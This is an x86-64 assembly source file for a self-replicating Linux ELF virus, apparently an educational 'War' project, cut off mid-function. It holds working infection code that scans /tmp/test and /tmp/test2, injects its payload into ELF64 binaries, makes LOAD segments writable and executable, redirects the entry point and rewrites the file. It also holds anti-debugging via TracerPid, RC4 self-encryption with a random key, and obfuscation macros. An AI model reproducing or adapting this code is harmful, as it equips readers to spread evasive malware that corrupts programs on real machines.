%include "srcs/header.s"


section .text
global _start

_start:
	PUSHAQ						; save original program params

	call anti_debug

	mov BYTE[rsp], 1			; with the PUSHAQ, BYTE[rsp] = r15

	check_original_payload:		; REPERE! Ne pas modifier sinon modify_payload() est cassé
	mov rdi, 0xaaaaaaaa			; rdi == rsi if it's the orginal virus		-> no decryption()
	OBF1 0xcf
	mov rsi, 0xaaaaaaaa			; rdi != rsi if it's an infected program	-> decryption()
	cmp rdi, rsi
	je main

	mov BYTE[rsp], 0			; it's an infected program

	lea rdi, [rel main]
	mov rsi, key - main
	OBF2 0xcf
	lea rdx, [rel key]
	mov r10, KEY_LEN
	OBF1 0x0f
	call rc4					; rc4(&main, len, key, KEY_LEN)

	jmp main

exit_debug:
	mov rax, WRITE
	mov rdi, STDOUT
	OBF_USELESS 0xcf
	lea rsi, [rel msg_anti_debug]
	mov rdx, 12
	syscall
exit:
	mov rax, EXIT
	syscall

anti_debug:
	ENTER_OBF READ_BUF + 4

	OBF3
	mov rax, OPEN
	lea rdi, [rel proc_status]
	mov rsi, O_RDONLY
	OBF1 0xcf
	syscall
	mov DWORD[rsp], eax				; fd = open("/proc/self/status", O_RDONLY)
	cmp rax, 0						; if (fd < 0)
	jl _ret							;	return

	OBF2 0x0f
	mov rax, READ
	xor rdi, rdi
	mov edi, DWORD[rsp]
	lea rsi, [rsp + 4]
	mov rdx, READ_BUF
	syscall							; rd = read(fd, &rsp, PATH_MAX)

	mov edi, DWORD[rsp]
	MOV_OBF1 rax, CLOSE
	syscall							; close(fd)

	lea rdi, [rsp + 4]
	lea rsi, [rel tracerpid]
	mov rdx, READ_BUF
	OBF1 0xcf
	call anti_debug_strstr			; anti_debug_strstr(*rsp, "TracerPid\t", READ_BUF)
	cmp al, 0x30
	jne exit_debug

	jmp _ret

anti_debug_strstr:		; rdi = haystack;  rsi = needle;  rdx = len
	ENTER_OBF 0

	xor r8, r8												; int i = 0
	anti_debug_strstr_while_haystack:						; while (i < len)
		xor r9, r9											;	int j = 0
		anti_debug_strstr_while_needle:						;	do
			OBF_USELESS 0xcf
			mov al, BYTE[rdi + r8]							;		char a = haystack[i]
			mov bl, BYTE[rsi + r9]							;		char b = needle[j]
			cmp bl, 0										;		if (b == '\0')
			je _ret											;			return 0
			cmp r8, rdx										;		if (i >= len)
			jae anti_debug_strstr_while_haystack_increase	;			break
			cmp al, bl										;		if (a != b)
			jne anti_debug_strstr_while_haystack_increase	;			break
			inc r8											;		i++
			OBF2 0xcf
			inc r9											;		j++
			jmp anti_debug_strstr_while_needle				;	while (a == b)

		anti_debug_strstr_while_haystack_increase:
		sub r8, r9											;	i -= j
		inc r8												;	i++
		cmp r8, rdx
		jb anti_debug_strstr_while_haystack

	mov rax, 0x30		; return 0x30
	jmp _ret

rc4:					; rdi = &main;  rsi = len;  rdx = key;  r10 = ken_len
	ENTER_OBF 0x110					; rsp = S[256]	(+16: security)
	mov r8, rdx						; r8 = key
	mov r9, r10						; r9 = key_len
	OBF3
	mov r10, rdi					; r10 = str to encrypt or decrypt
	mov r11, rsi					; r11 = str_len

	xor rcx, rcx					; int i = 0
	rc4_init_S:						; while (i < 256)
		mov byte[rsp + rcx], cl		;	S[i] = i
		OBF1 0x0f
		inc rcx						;	i++
		cmp rcx, 0x100
		jl rc4_init_S

	xor rcx, rcx					; i = 0
	xor r12, r12					; j = 0
	rc4_mix_S:						; while (i < 256)
		; j = (j + S[i] + key[i % len]) % 256;
		xor rdx, rdx
		mov rax, rcx
		mov rbx, r9
		OBF2 0xcf
		div rbx						;	rdx = i % klen

		xor r13, r13
		mov r13b, byte[r8 + rdx]	;	r13 = key[i % klen]

		xor r14, r14
		mov r14b, byte[rsp + rcx]	;	r14 = S[i]

		OBF_USELESS 0xcf
		add r12, r13				;	j += r13
		add r12, r14				;	j += r14

		mov rax, r12
		mov rbx, 0x100
		OBF1 0x0f
		div rbx						;	rbx = j % 256
		mov r12, rdx				;	j = j % 256

		; swap = S[i];
		; S[i] = S[j];
		; S[j] = swap;
		mov r13b, byte[rsp + rcx]	;	r13 = S[i]
		mov r14b, byte[rsp + r12]	;	r14 = S[j]
		OBF1 0x0f
		mov byte[rsp + rcx], r14b	;	S[i] = S[j]
		mov byte[rsp + r12], r13b	;	S[j] = S[i]

		inc rcx						;	i++
		cmp rcx, 0x100
		OBF1 0xcf
		jl rc4_mix_S

	xor rcx, rcx					; k = 0
	xor r12, r12					; i = 0
	xor r13, r13					; j = 0
	rc4_magic:						; while (k < str_len)
		; i = (i + 1) % 256;
		inc r12							; i++
		xor rdx, rdx
		mov rax, r12
		mov rbx, 0x100
		OBF_USELESS 0x0f
		div rbx							; rbx = i % 256
		mov r12, rdx					; i = i % 256

		; j = (j + S[i]) % 256;
		xor r14, r14
		mov r14b, byte[rsp + r12]		; r14 = S[i]
		add r13, r14					; j += S[i]
		OBF3
		mov rax, r13
		mov rbx, 0x100
		div rbx
		mov r13, rdx					; j = j % 256

		; swap = S[i];
		; S[i] = S[j];
		; S[j] = swap;
		mov r14b, byte[rsp + r12]		; r14 = S[i]

		xor r15, r15
		mov r15b, byte[rsp + r13]		; r15 = S[j]

		OBF1 0xcf
		mov byte[rsp + r12], r15b		; S[i] = S[j]
		mov byte[rsp + r13], r14b		; S[j] = S[i]

		; cipher = S[(S[i] + S[j]) % 256];
		add r14, r15					; r14 = S[i] + S[j]
		mov rax, r14
		mov rbx, 0x100
		OBF2 0x0f
		div rbx
		mov r14, rdx					; r14 = (S[i] + S[j]) % 256
		mov r15b, byte[rsp + r14]		; cipher = S[(S[i] + S[j]) % 256]

		OBF3
		xor byte[r10], r15b				; str[k] = cipher ^ str[k];

		inc rcx							; k++
		inc r10							; str++
		cmp rcx, r11
		jl rc4_magic

	jmp _ret

_ret_1:
	mov rax, 1
_ret:
	leave
	ret

main:
	; check if le proc "test" is running
	OBF3
	lea rdi, [rel proc_dir]
	mov rsi, 1
	call war					; war("/proc", 0)

	; infection routine
	OBF2 0xcf
	lea rdi, [rel dir1]
	mov rsi, 0
	call war					; war("/tmp/test", 0)
	OBF1 0x0f
	lea rdi, [rel dir2]
	mov rsi, 0
	call war					; war("/tmp/test2", 0)

	POPAQ						; restore registers therefore r15 = BYTE[rsp]

	cmp r15b, 0					; r15 != 0 if it's the orginal virus		-> exit()
	je exit_payload				; r15 == 0 if it's an infected program		-> jmp
	jmp exit

exit_payload:			; REPERE! Ne pas modifier sinon modify_payload() est cassé
	jmp 0xbbbbbbbb		; jump to the original entry of the infected program

encryption:
set_fingerprint:		; r8 = &fingerprint;  r9 = fingerprint_nb
	ENTER 0

	OBF1 0xcf
	cmp r9, BASE_HEX
	jge set_fingerprint_10

	lea rsi, [rel hex_nb]
	add rsi, r9
	xor rdi, rdi
	mov dil, BYTE[rsi]
	OBF_USELESS 0x0f
	mov BYTE[r8], dil
	inc r8
	jmp _ret

	set_fingerprint_10:
	mov r15, r9
	xor rdx, rdx
	mov rax, r15
	mov rcx, BASE_HEX
	OBF2 0x0f
	idiv rcx
	mov r9, rax
	push rdx
	call set_fingerprint
	pop r9
	call set_fingerprint
	jmp _ret

check_proc:				; rdi = procfoldername
	ENTER_OBF PATH_MAX + 4

	lea rsi, [rel proc_dir_name]
	lea rdx, [rsp]
	call strcat							; rsp = strcat(procfoldername, "comm", procfilename)

	OBF3
	mov rax, OPEN
	lea rdi, [rsp]
	mov rsi, O_RDONLY
	syscall
	mov DWORD[rsp + PATH_MAX], eax		; fd = open(procfilename, O_RDONLY)
	cmp rax, 0							; if (fd < 0)
	jl _ret								;	return

	mov rax, READ
	xor rdi, rdi
	mov edi, DWORD[rsp + PATH_MAX]
	lea rsi, [rsp]
	mov rdx, PATH_MAX
	OBF1 0x0f
	syscall								; rd = read(fd, &rsp, PATH_MAX)
	mov BYTE[rsp + rax], 0				; rsp[rd] = '\0'

	lea rdi, [rsp]
	lea rsi, [rel proc_name]
	call strcmp
	cmp rax, 0							;	if (ft_strcmp(&rsp, "test\n")
	je exit								;		exit()

	mov edi, DWORD[rsp + PATH_MAX]
	mov rax, CLOSE
	syscall								; close(fd)

	jmp _ret_obf

check_file:				; rdi = s_war  |  r8 = s_war;  r9 = ehdr
	ENTER 0
	MOV_OBF2 r8, rdi								; r8 = s_war
	mov r9, QWORD[r8 + s_war.ptr]					; r9 = ehdr

	check_elf_ehdr:
	OBF3
	mov rdi, QWORD[r8 + s_war.old_ptr_len]
	cmp rdi, EHDR_SIZE								; if (s_war.old_ptr_len < EHDR_SIZE)
	jl check_file_error								;	return 0

	mov edi, DWORD[r9 + ehdr.ei_mag]
	cmp edi, ELFMAG									; if (&ehdr->e_ident[0] != ".ELF")
	jne check_file_error							;	return 0

	mov dil, BYTE[r9 + ehdr.ei_class]
	cmp dil, ELFCLASS64								; if (&ehdr->e_ident[EI_CLASS] != ELFCLASS64)
	jne check_file_error							;	return 0

	OBF_USELESS 0xcf
	mov dil, BYTE[r9 + ehdr.ei_data]
	cmp dil, 2										; if (!ehdr->e_ident[EI_DATA] > 2)
	jg check_file_error								;	return 0

	mov dil, BYTE[r9 + ehdr.ei_version]
	cmp dil, EV_CURRENT								; if (ehdr->e_ident[EI_VERSION] != EV_CURRENT)
	jne check_file_error							;	return 0

	mov di, WORD[r9 + ehdr.e_type]
	cmp di, ET_EXEC
	je check_file_ehsize
	mov di, WORD[r9 + ehdr.e_type]
	cmp di, ET_DYN									; if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN)
	jne check_file_error							;	return 0

	check_file_ehsize:
	mov di, WORD[r9 + ehdr.e_ehsize]
	cmp di, EHDR_SIZE								; if (ehdr->e_ehsize != EHDR_SIZE)
	jne check_file_error							;	return 0

	mov rdi, QWORD[r9 + ehdr.e_phoff]
	cmp rdi, EHDR_SIZE								; if (ehdr->e_phoff != EHDR_SIZE)
	jne check_file_error							;	return 0

	OBF1 0xcf
	mov di, WORD[r9 + ehdr.e_phentsize]
	cmp di, PHDR_SIZE								; if (ehdr->e_phentsize != PHDR_SIZE)
	jne check_file_error							;	return 0

	mov di, WORD[r9 + ehdr.e_phnum]
	cmp di, 1										; if (ehdr->e_phnum < 1)
	jl check_file_error								;	return 0

	mov di, WORD[r9 + ehdr.e_shentsize]
	cmp di, SHDR_SIZE								; if (ehdr->e_shentsize != SHDR_SIZE)
	jne check_file_error							;	return 0

	OBF2 0xcf
	mov rdi, QWORD[r9 + ehdr.e_shnum]
	cmp rdi, 1										; if (ehdr->e_shnum < 1)
	jl check_file_error								;	return 0

	check_elf_phdr:
	xor rax, rax
	mov di, WORD[r9 + ehdr.e_phnum]
	mov ax, WORD[r9 + ehdr.e_phentsize]
	OBF1 0xcf
	mul di
	add ax, WORD[r9 + ehdr.e_ehsize]
	mov rsi, QWORD[r8 + s_war.old_ptr_len]
	cmp rax, rsi									; if ((ehdr->e_phnum * ehdr->e_phentsize + ehdr->e_ehsize) > g_woody->old_ptr_len)
	jg check_file_error								;	return 0

	mov r10, QWORD[r9 + ehdr.e_phoff]
	add r10, r9										; r10 = phdr = ehdr + ehdr->e_phoff

	mov cx, WORD[r9 + ehdr.e_phnum]
	check_elf_phdr_while:							; while ((cx = ehdr.e_phnum) > 0)
		OBF_USELESS 0xcf
		mov rdi, QWORD[r10 + phdr.p_offset]
		add rdi, QWORD[r10 + phdr.p_filesz]
		mov rsi, QWORD[r8 + s_war.old_ptr_len]
		cmp rdi, rsi								;	if ((phdr->p_offset + phdr->p_filesz) > (uint64_t)g_woody->old_ptr_len)
		ja check_file_error							;		return 0
		add r10, PHDR_SIZE							;	phdr++
		dec cx										;	cx--
		cmp cx, 0
		jg check_elf_phdr_while

	check_elf_shdr:
	xor rax, rax
	mov di, WORD[r9 + ehdr.e_shnum]
	mov ax, WORD[r9 + ehdr.e_shentsize]
	mul di
	add ax, WORD[r9 + ehdr.e_ehsize]
	mov rsi, QWORD[r8 + s_war.old_ptr_len]
	cmp rax, rsi									; if ((ehdr->e_phnum * ehdr->e_phentsize + ehdr->e_ehsize) > g_woody->old_ptr_len)
	jg check_file_error								;	return 0

	mov r10, QWORD[r9 + ehdr.e_shoff]
	add r10, r9										; r10 = shdr = ehdr + ehdr->e_shoff

	OBF_USELESS 0x0f
	xor rax, rax
	mov si, WORD[r9 + ehdr.e_shstrndx]
	mov ax, SHDR_SIZE
	mul si
	add rax, r10
	mov rdi, QWORD[rax + shdr.sh_offset]
	add rdi, r9
	push rdi										; strtab = (char*)g_woody->ptr + shdr[ehdr->e_shstrndx].sh_offset

	mov cx, WORD[r9 + ehdr.e_shnum]
	check_elf_shdr_while:							; while ((cx = ehdr.e_shnum) > 0)
		mov rdi, QWORD[r10 + shdr.sh_offset]
		OBF1 0xcf
		add rdi, QWORD[r10 + shdr.sh_size]
		mov rsi, QWORD[r8 + s_war.old_ptr_len]
		cmp rdi, rsi
		jbe check_elf_shdr_while_increase
		xor rdi, rdi
		mov edi, DWORD[r10 + shdr.sh_name]
		mov rsi, [rsp]
		OBF2 0xf0
		add rdi, rsi
		lea rsi, [rel bss_name]
		call strcmp
		cmp rax, 0									;	if ((shdr->sh_offset + shdr->sh_size) > s_war.old_ptr_len && ft_strcmp(&symtab[shdr->sh_name], ".bss")
		jne check_file_error						;		return 0

		check_elf_shdr_while_increase:
		add r10, SHDR_SIZE							;	shdr++
		dec cx										;	cx--
		cmp cx, 0
		jg check_elf_shdr_while

	jmp _ret_1
	check_file_error:
	mov rax, 0
	jmp _ret

is_infected:			; r8 = s_war;  r9 = ehdr;  r10 = shdr_data
	ENTER 0

	OBF1 0xf0
	mov rax, QWORD[r10 + shdr.sh_offset]
	add rax, QWORD[r10 + shdr.sh_size]
	add rax, signature - _start
	mov rdx, QWORD[r8 + s_war.old_ptr_len]
	cmp rax, rdx								; if (shdr_data.sh_offset + shdr_data.sh_size + (&signature - &_start) >= s_war.old_ptr_len)
	jge _ret_1									;	return 1
	mov rdi, r9
	add rdi, rax								; rdi = &ptr[shdr_data.sh_offset + shdr_data.sh_size + &signature]
	lea rsi, [rel signature]					; rsi = &signature
	OBF2 0xcf
	sub rdx, rax								; rdx = old_ptr_len - (rdi - ptr)
	call strstr									; return (strstr(rdi, rsi, rdx))
	jmp _ret

find_data_section:		; r8 = s_war;  r9 = ehdr
	ENTER_OBF 0

	mov r10, QWORD[r9 + ehdr.e_shoff]
	add r10, r9									; r10 = shdr

	OBF_USELESS 0xf0
	xor rax, rax
	mov si, WORD[r9 + ehdr.e_shstrndx]
	mov ax, SHDR_SIZE
	mul si
	add rax, r10
	mov rdi, QWORD[rax + shdr.sh_offset]
	add rdi, r9
	push rdi									; strtab = s_war.ptr + shdr[ehdr->e_shstrndx].sh_offset

	mov cx, WORD[r9 + ehdr.e_shnum]
	find_data_section_while:					; while ((cx = ehdr.e_shnum) > 0)
		xor rdi, rdi
		mov edi, DWORD[r10 + shdr.sh_name]
		mov rsi, [rsp]
		add rdi, rsi
		lea rsi, [rel data_name]
		OBF1 0xcf
		call strcmp
		cmp rax, 0								;	if (!ft_strcmp(&strtab[shdr->sh_name], ".data"))
		je find_data_section_set				;		return
		
		add r10, SHDR_SIZE						;	shdr++;
		dec cx									;	cx--
		cmp cx, 0
		jg find_data_section_while

	mov rax, 0
	jmp _ret

	find_data_section_set:
	OBF3
	mov QWORD[r8 + s_war.data_shdr], r10	; s_war.data_shdr = shdr
	call is_infected							; is_infected()
	jmp _ret_obf

modify_load_segments:	; r8 = s_war;  r9 = ehdr
	ENTER 0
	mov r10, QWORD[r9 + ehdr.e_phoff]
	add r10, r9												; r10 = phdr

	OBF1 0xf0
	mov r11, QWORD[r8 + s_war.data_shdr]					; r11 = data_shdr

	mov QWORD[r8 + s_war.load_phdr], 0						; s_war.load_phdr = NULL

	mov cx, WORD[r9 + ehdr.e_phnum]
	modify_load_segments_while:								; while ((cx = ehdr.e_phnum) > 0)
		mov edi, DWORD[r10 + phdr.p_type]
		cmp edi, P_LOAD
		jne modify_load_segments_modification				;	if (phdr->p_type == P_LOAD)
			mov DWORD[r10 + phdr.p_flags], PF_RWX			;		phdr->p_flags = PF_R | PF_W | PF_X;

		mov rdi, QWORD[r11 + shdr.sh_offset]
		OBF1 0xcf
		mov rsi, QWORD[r10 + phdr.p_offset]
		cmp rdi, rsi
		jl modify_load_segments_modification				;	if (phdr->p_type == P_LOAD && (s_war.data_shdr->sh_offset >= phdr->p_offset
		add rsi, QWORD[r10 + phdr.p_filesz]
		OBF2 0x0f
		cmp rdi, rsi
		jge modify_load_segments_modification				;	&& s_war.data_shdr->sh_offset < phdr->p_offset + phdr->p_filesz))
			mov QWORD[r8 + s_war.load_phdr], r10			;		s_war.load_phdr = phdr
			mov rax, QWORD[r10 + phdr.p_vaddr]
			add rax, QWORD[r10 + phdr.p_memsz]
			mov QWORD[r8 + s_war.new_entry], rax			;		s_war.new_entry = phdr->p_vaddr + phdr->p_memsz
			OBF3
			mov rax, QWORD[r10 + phdr.p_offset]
			add rax, QWORD[r10 + phdr.p_filesz]
			mov QWORD[r8 + s_war.offset_code], rax			;		s_war.offset_code = phdr->p_offset + phdr->p_filesz
			mov rax, QWORD[r10 + phdr.p_memsz]
			sub rax, QWORD[r10 + phdr.p_filesz]
			mov QWORD[r8 + s_war.bss_size], rax				;		s_war.bss_size = phdr->p_memsz - phdr->p_filesz
			OBF_USELESS 0xf0
			mov QWORD[r8 + s_war.added_size], PAYLOAD_SIZE
			add QWORD[r8 + s_war.added_size], rax			;		s_war.added_size = PAYLOAD_SIZE + s_war.bss_size
			jmp modify_load_segments_increase

		modify_load_segments_modification:
		OBF2 0xcf
		cmp QWORD[r8 + s_war.load_phdr], 0
		je modify_load_segments_increase					;	else if (s_war.load_phdr
		mov rdi, QWORD[r10 + phdr.p_offset]
		mov rsi, QWORD[r8 + s_war.load_phdr + phdr.p_offset]
		add rsi, QWORD[r8 + s_war.load_phdr + phdr.p_filesz]
		cmp rdi, rsi
		jle modify_load_segments_increase					;	&& phdr->p_offset > s_war.load_phdr->p_offset + s_war.load_phdr->p_filesz)
			mov rax, QWORD[r8 + s_war.added_size]
			add QWORD[r10 + phdr.p_offset], rax				;		phdr->p_offset += s_war.added_size
			mov rbx, QWORD[r10 + phdr.p_paddr]
			OBF3
			cmp rbx, 0
			je modify_load_segments_increase				;		if (phdr->p_paddr != 0)
				add QWORD[r10 + phdr.p_paddr], rax			;			phdr->p_paddr += s_war.added_size
				add QWORD[r10 + phdr.p_vaddr], rax			;			phdr->p_vaddr += s_war.added_size

		modify_load_segments_increase:
		add r10, PHDR_SIZE									;	phdr++
		dec cx												;	cx--
		cmp cx, 0
		jg modify_load_segments_while

	mov rax, QWORD[r8 + s_war.load_phdr]
	cmp rax, 0												; if (s_war.load_phdr == NULL)
	je _ret													;	return 0
	mov rax, 1												; else
	jmp _ret												;	return 1

modify_sections:		; r8 = s_war;  r9 = ehdr
	ENTER_OBF 0

	OBF_USELESS 0xcf
	mov r10, QWORD[r9 + ehdr.e_shoff]
	add r10, r9											; r10 = shdr

	mov r11, QWORD[r8 + s_war.load_phdr]				; r11 = load_phdr

	xor rax, rax
	mov si, WORD[r9 + ehdr.e_shstrndx]
	MOV_OBF1 ax, SHDR_SIZE
	mul si
	add rax, r10
	mov rdi, QWORD[rax + shdr.sh_offset]
	add rdi, r9
	push rdi											; strtab = s_war.ptr + shdr[ehdr->e_shstrndx].sh_offset

	mov cx, WORD[r9 + ehdr.e_shnum]
	modify_sections_while:								; while ((cx = ehdr.e_shnum) > 0)
		mov rdi, QWORD[r10 + shdr.sh_offset]
		mov rsi, QWORD[r11 + phdr.p_offset]
		add rsi, QWORD[r11 + phdr.p_filesz]
		OBF3
		cmp rdi, rsi
		jl modify_sections_while_increase				;	if (shdr->sh_offset >= g_woody->datas.load_phdr->p_offset + g_woody->datas.load_phdr->p_filesz
		xor rdi, rdi
		mov edi, DWORD[r10 + shdr.sh_name]
		mov rsi, [rsp]
		add rdi, rsi
		lea rsi, [rel bss_name]
		call strcmp
		cmp rax, 0
		je modify_sections_while_increase				;	&& ft_strcmp(".bss", &strtab[shdr->sh_name]))
			mov rax, QWORD[r8 + s_war.added_size]
			add QWORD[r10 + shdr.sh_offset], rax		;		shdr->sh_offset += s_war.added_size
			mov rbx, QWORD[r10 + shdr.sh_addr]
			cmp rbx, 0
			je modify_sections_while_increase			;		if (shdr->sh_addr != 0)
				add QWORD[r10 + shdr.sh_addr], rax		;			shdr->sh_addr += s_war.added_size
		
		modify_sections_while_increase:
		add r10, SHDR_SIZE								;	shdr++
		dec cx											;	cx--
		OBF2 0xf0
		cmp cx, 0
		jg modify_sections_while
	jmp _ret_obf

modify_payload:			; rdi = &ptr[s_war.offset_code]  |  r8 = s_war
	ENTER 0
	push rdi

	; change la value of the program's first comparison to know that it is an infected file
	MOV_OBF1 rax, check_original_payload - _start
	inc rax
	add rdi, rax
	mov DWORD[rdi], 0xabcdabcd				; rdi[check_original_payload + 1] = 0xabcdabcd

	; change the value of the end jmp to jump to the start of the original program
	MOV_OBF1 r10, exit_payload - _start
	inc r10
	mov rdi, QWORD[rsp]
	add rdi, r10							; rdi = rdi[offset_payload_final_jmp]
	mov rax, QWORD[r8 + s_war.old_entry]
	mov rbx, QWORD[r8 + s_war.new_entry]
	add rbx, r10
	OBF1 0xcf
	sub rax, rbx
	sub rax, 4								; rax = offset_old_entry = s_war.old_entry - (s_war.new_entry + offset_payload_final_jmp) - 4
	mov DWORD[rdi], eax						; rdi[offset_payload_final_jmp] = offset_old_entry

	; set the FINGERPRINT
	sub rsp, TIMEVAL_SIZE
	MOV_OBF1 rax, GETTIMEOFDAY
	lea rdi, [rsp]
	mov rsi, 0
	syscall
	cmp rax, 0
	jne end_fingerprint

	mov rdi, QWORD[rsp]
	shl rdi, 24
	or rdi, QWORD[rsp + 8]
	mov QWORD[rsp], rdi
	mov QWORD[rsp + 8], rdi

	lea rdi, [rsp]
	MOV_OBF1 rsi, 7
	lea rdx, [rsp + 8]
	mov r10, 7
	push r8
	push r9
	call rc4								; rc4(&time, 7, time, 7)

	mov r8, QWORD[rsp + 32]
	OBF3
	mov r10, signature - _start
	add r8, r10
	add r8, 43
	mov r9, QWORD[rsp + 16]
	call set_fingerprint					; set_fingerprint(&fingerprint, fingerprint_nb)

	pop r9
	pop r8

	end_fingerprint:
	add rsp, TIMEVAL_SIZE

	; set key for the encryption
	mov rax, OPEN
	lea rdi, [rel urandom]
	MOV_OBF1 rsi, O_RDONLY
	syscall
	cmp rax, 0								; if (open("/dev/urandom", O_RDONLY) < 0)
	jl encryption_playload					;	return
	push rax

	MOV_OBF1 rax, READ
	mov rdi, QWORD[rsp]
	mov rsi, QWORD[rsp + 8]
	mov r10, key - _start
	add rsi, r10
	mov rdx, KEY_LEN
	syscall									; read(fd, rdi[key], KEY_LEN)

	mov rax, CLOSE
	pop rdi
	syscall									; close(fd)

	encryption_playload:
	mov rdi, QWORD[rsp]
	MOV_OBF1 r10, main - _start
	add rdi, r10
	mov rsi, key - main
	mov rdx, QWORD[rsp]
	mov r10, key - _start
	add rdx, r10
	mov r10, KEY_LEN
	push r8
	push r9
	call rc4					; rc4(&main, len, key, KEY_LEN)
	pop r9
	pop r8
	jmp _ret

create_new_program:		; rdi = s_war.ptr_len  |  r8 = s_war
	ENTER rdi

	MOV_OBF2 r9, rsp									; r9 = ptr[ptr_len]

	xor rcx, rcx
	push rcx									; int i = 0

	MOV_OBF2 rdi, r9
	mov rsi, QWORD[r8 + s_war.ptr]
	mov rdx, QWORD[r8 + s_war.offset_code]
	call memcpy									; memcpy(ptr, s_war.ptr, s_war.offset_code)
	add [rsp], rdx								; i += s_war.offset_code

	mov rdi, r9
	add rdi, [rsp]
	xor rsi, rsi
	OBF3
	mov rdx, QWORD[r8 + s_war.bss_size]
	call memset									; memset(ptr + i, 0, s_war.bss_size)
	add [rsp], rdx								; i += s_war.bss_size

	mov rdi, r9
	add rdi, [rsp]
	lea rsi, [rel _start]
	mov rdx, PAYLOAD_SIZE
	call memcpy									; memcpy(ptr + i, [rel _start], PAYLOAD_SIZE)

	OBF_USELESS 0xcf
	mov rdi, r9
	add rdi, [rsp]
	call modify_payload							; modify_payload(ptr + i)

	mov rax, PAYLOAD_SIZE
	add [rsp], rax								; i += PAYLOAD_SIZE

	mov rdi, r9
	add rdi, [rsp]
	mov rsi, QWORD[r8 + s_war.ptr]
	mov rax, QWORD[r8 + s_war.offset_code]
	add rsi, rax
	mov rdx, QWORD[r8 + s_war.old_ptr_len]
	sub rdx, rax
	call memcpy									; ft_memcpy(ptr + i, s_war.ptr + s_war.offset_code, s_war.old_ptr_len - s_war.offset_code)

	create_new_program_munmap_close:
	push r9
	push r8										; save registers

	MOV_OBF1 rax, MUNMAP
	mov rdi, QWORD[r8 + s_war.ptr]
	mov rsi, QWORD[r8 + s_war.old_ptr_len]
	syscall										; munmap(s_war.ptr, s_war.old_ptr_len)

	mov r8, QWORD[rsp]							; r8 = s_war

	mov rax, CLOSE
	xor rdi, rdi
	mov edi, DWORD[r8 + s_war.fd]
	syscall										; close(s_war.fd)

	mov r8, QWORD[rsp]							; r8 = s_war

	MOV_OBF1 rax, OPEN
	mov rdi, QWORD[r8 + s_war.filename]
	mov rsi, OPEN_FLAG
	syscall
	cmp rax, 0									; if (open(s_war.filename, O_WRONLY | O_TRUNC) < 0)
	jl _ret										;	return

	pop r8
	pop r9										; restore registers

	mov [rsp], rax								; i = fd

	mov rax, WRITE
	mov rdi, [rsp]
	MOV_OBF2 rsi, r9
	mov rdx, QWORD[r8 + s_war.ptr_len]
	syscall										; write(fd, ptr, s_war.ptr_len)

	MOV_OBF1 rax, CLOSE
	mov rdi, [rsp]
	syscall										; close(fd)

	jmp _ret_obf

injection:				; rdi = s_war  |  r8 = s_war;  r9 = ehdr
	ENTER_OBF 0
	mov r8, rdi										; r8 = s_war
	mov r9, QWORD[r8 + s_war.ptr]					; r9 = ehdr

	OBF3
	call find_data_section
	cmp rax, 0										; if (find_data_section() == 0)
	je _ret											;	return

	mov rax, QWORD[r9 + ehdr.e_entry]
	mov QWORD[r8 + s_war.old_entry], rax			; s_war.old_entry = ehdr.e_entry

	call modify_load_segments
	cmp rax, 0										; if (modify_load_segments() == 0)
	je _ret											;	return

	OBF1 0x0f
	call modify_sections							; modify_sections()

	update_hdr:
	mov rax, QWORD[r8 + s_war.new_entry]
	mov QWORD[r9 + ehdr.e_entry], rax				; ehdr->e_entry = s_war.new_entry
	mov rax, QWORD[r8 + s_war.added_size]
	add QWORD[r9 + ehdr.e_shoff], rax				; ehdr->e_shoff += s_war.added_size
	mov r11, QWORD[r8 + s_war.load_phdr]			; r11 = load_phdr
	add QWORD[r11 + phdr.p_filesz], rax				; s_war.load_phdr->p_filesz += s_war.added_size
	mov rax, QWORD[r11 + phdr.p_filesz]
	mov QWORD[r11 + phdr.p_memsz], rax				; s_war.load_phdr->p_memsz = s_war.load_phdr->p_filesz

	mov rdi, QWORD[r8 + s_war.old_ptr_len]
	add rdi, QWORD[r8 + s_war.added_size]
	mov QWORD[r8 + s_war.ptr_len], rdi				; s_war.ptr_len = s_war.old_ptr_len + s_war.added_size

	OBF_USELESS 0xcf
	call create_new_program							; create_new_program()

	mov rax, 1
	jmp _ret

infection:				; rdi = filename
	ENTER_OBF S_WAR_SIZE

	mov QWORD[rsp + s_war.filename], rdi		; s_war.filename = filename

	MOV_OBF1 rax, OPEN
	mov rsi, O_RDONLY
	OBF1 0x0f
	syscall
	mov DWORD[rsp + s_war.fd], eax 				; s_war.fd = open(filename, O_RDONLY)
	cmp rax, 0									; if (s_war.fd < 0)
	jl _ret										;	return

	MOV_OBF1 rax, LSEEK
	mov edi, DWORD[rsp + s_war.fd]
	mov rsi, 0
	mov rdx, SEEK_END
	syscall
	mov QWORD[rsp + s_war.old_ptr_len], rax		; s_war.old_ptr_len = lseek(fd, 0, SEEK_END)
	cmp rax, -1									; if (s_war.old_ptr_len == -1)
	je infection_close							;	return;

	MOV_OBF1 rax, MMAP
	mov rdi, 0
	mov rsi, QWORD[rsp + s_war.old_ptr_len]
	mov rdx, PROT_READ
	xor rdx, PROT_WRITE
	mov r10, MAP_PRIVATE
	mov r8d, DWORD[rsp + s_war.fd]
	mov r9, 0
	syscall
	mov QWORD[rsp + s_war.ptr], rax				; s_war.ptr = mmap(0, s_war.old_ptr_len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)
	cmp rax, 0									; if (s_war.ptr == NULL)
	je infection_close							;	return;

	MOV_OBF2 rdi, rsp
	call check_file
	cmp rax, 1									; if (check_file(&s_war) != 1)
	jne infection_munmap						;	return

	OBF2 0x0f
	mov rdi, rsp
	call injection
	cmp rax, 1									; if (injection(&s_war) == 1)
	je _ret										;	return

	infection_munmap:
	mov rsi, QWORD[rsp + s_war.old_ptr_len]
	mov rdi, QWORD[rsp + s_war.ptr]
	mov rax, MUNMAP
	syscall										; munmap(s_war.ptr, s_war.old_ptr_len)

	infection_close:
	OBF3
	mov edi, DWORD[rsp + s_war.fd]
	mov rax, CLOSE
	syscall										; close(s_war.fd)
	jmp _ret_obf

war:					; rdi = folder;  rsi = proc  |  r8 = folder;  r9 = proc;  r10 = fd;  r11 = nread
	ENTER_OBF DIRENT_BUF
	mov r8, rdi
	MOV_OBF2 r9, rsi

	mov rax, OPEN
	OBF_USELESS 0x0f
	mov rsi, OPEN_DIRECTORY
	syscall
	cmp rax, 0					; if ((fd = open(folder, O_RDONLY | O_DIRECTORY)) < 0)
	jl _ret						;	return
	mov r10, rax

	war_while:					; while (1)
		MOV_OBF1 rax, GETDENTS
		mov rdi, r10
		lea rsi, [rsp]
		mov rdx, DIRENT_BUF
		OBF2 0xcf
		syscall					; nread = getdents(fd, buf, DIRENT_BUF)
